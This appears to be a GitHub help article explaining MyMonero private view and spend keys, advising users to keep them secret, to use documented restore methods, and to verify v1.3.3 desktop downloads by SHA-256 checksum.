<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Private View and Spend Keys</h1>
<p align="center">Learn what these wallet credentials mean and how to keep them private.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A private view key and a private spend key are sensitive wallet credentials, distinct from your password and from your seed phrase. Treat both keys as private: never send them to support, paste them into a website, or publish them.

## You'll see this if
- A wallet restore screen asks about a private key and you are unsure what it means.
- You found a note labeled “view key” or “spend key” and want to identify it.
- Someone asks you to provide a key to check a balance or recover a wallet.
- You are comparing keys with a 13-word or 25-word seed.
- You plan to move your wallet to another device or application.

## Why it happens
Wallets use different credentials for different purposes. A password may protect an app installation, while a seed is a recovery phrase. Private view and private spend keys are also sensitive wallet information; they are not interchangeable with the password or seed. Exact handling depends on the wallet and its restore options, so do not infer that one credential can replace another.

The safest way to think about these values is as secrets. Someone asking for them may be able to compromise privacy or wallet control. A person claiming to be official support does not need your seed or private keys to explain general steps. MyMonero’s final desktop release is v1.3.3. The old app still opens wallets and sends XMR but is no longer maintained and receives no new features or security updates. MyMonero hosted servers and web wallet login stopped. See [finding a MyMonero seed](./find-mymonero-seed.md), [seed formats](./mymonero-seed-13-vs-25-words.md), and [the release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

---

## Fix
1. **Identify the label, not the secret.** Read your private record locally. Note whether it says seed, private view key, private spend key, or password, but do not copy the actual value into a message. A label can help you choose the correct wallet instructions without exposing the credential.
2. **Do not submit credentials for a balance check.** Avoid online forms, social posts, remote-support sessions, and direct messages requesting a key. Nobody legitimate asks for your seed. Treat a request for a private key the same way: stop and verify through a route you independently trust.
3. **Use the wallet’s documented restore method.** If your goal is to recover a wallet, determine whether you have the complete seed or a particular key and select the matching option in the wallet you chose. MyMonero uses a 13-word legacy MyMonero-specific seed or a 25-word standard Monero seed. A key is not a seed phrase. See [13 versus 25 words](./mymonero-seed-13-vs-25-words.md).
4. **Keep the original record intact.** Do not edit, reformat, translate, or reorder sensitive information based on a web post. Make a secure offline copy if needed, and label it privately. Avoid screenshots and shared notes that can sync to accounts or devices you do not control.
5. **Choose a recovery option deliberately.** The final desktop release remains available on GitHub; the old app still opens wallets and sends XMR but has no ongoing maintenance or security updates. Alternatively, Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Confirm the chosen wallet’s instructions independently before entering any secret.
6. **Check the download separately.** If installing software, verify the asset’s SHA-256 against the value on the release page. This check uses a file digest, never a seed or key. Read [how to verify a MyMonero download](./verify-mymonero-download-sha256.md).
7. **Allow scanning after restoration.** A wallet may need to scan from a restore height, the block height where scanning begins. Earlier is safer when uncertain but takes longer. A missing balance is not a reason to disclose private data; review [restore height guidance](./mymonero-restore-height-explained.md).

> [!WARNING]
> Treat private view and spend keys as confidential. Never share them here, with a stranger, or in any website or form. Nobody legitimate needs your seed to provide general assistance.

## If that did not work
If you do not know which credential you have, pause and compare its label with your own records. Do not test it by pasting it into random software. If your records contain only a private key and not the seed, consult the selected wallet’s own instructions to understand what its restore options support. Do not assume that a particular key can recover every aspect of a wallet.

If you cannot reach the hosted MyMonero services, that is expected: hosted servers and web wallet login stopped. The old desktop app’s final release is v1.3.3 and is no longer maintained. You can continue using the desktop app or consider a seed restore in Cake Wallet. Avoid anyone who promises to activate a server, reset a wallet, or unlock funds in exchange for your keys.

If a restored wallet does not show the expected information, verify the credential type, selected restore method, and scan progress. Restore height is the starting block height; earlier is safer but slower. Do not make a sweep or send transaction to test a key. Sweeping means sending all funds to a new wallet and is a separate, intentional action. Read [the migration checklist](./mymonero-migration-checklist.md) before moving funds.

## Prevention
Keep a seed backup and any key records offline, encrypted or physically secured in a way you control. Store them apart from everyday browsing and messaging. Label each item clearly without putting the actual values on the outside of a storage container. Maintain enough context to know which wallet the credentials refer to, while minimizing exposed information.

Never reuse a secret in an online checker, customer support form, or search engine. Use a trusted device and carefully check the application before entering any recovery information. If someone unexpectedly requests a key, stop. Review [safe backup practices](./mymonero-backup-seed-safely.md), MyMonero recovery, and the migration scam guidance.

## FAQ
<details><summary>Are private keys the same as the seed?</summary>

No. A seed phrase and private view or spend keys are distinct wallet credentials. Keep all of them private.

</details>

<details><summary>Can support ask for my private keys?</summary>

Do not provide them. Nobody legitimate asks for your seed, and keys should also be treated as confidential.

</details>

<details><summary>Is my app password a key?</summary>

A password may protect an app installation; it is not the same as a seed or private key.

</details>

<details><summary>Can I use a key to download software?</summary>

No. Download integrity is checked by comparing a file’s SHA-256 digest with the release page, never by supplying wallet secrets.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Forgot MyMonero Password](./mymonero-forgot-password.md) | Separate an app password problem from wallet recovery. |
| [Back Up Your MyMonero Seed Safely](./mymonero-backup-seed-safely.md) | Keep recovery words private, legible, and available when you need them. |
| [Find Your MyMonero Seed](./find-mymonero-seed.md) | Locate the recovery phrase you saved when setting up your wallet. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
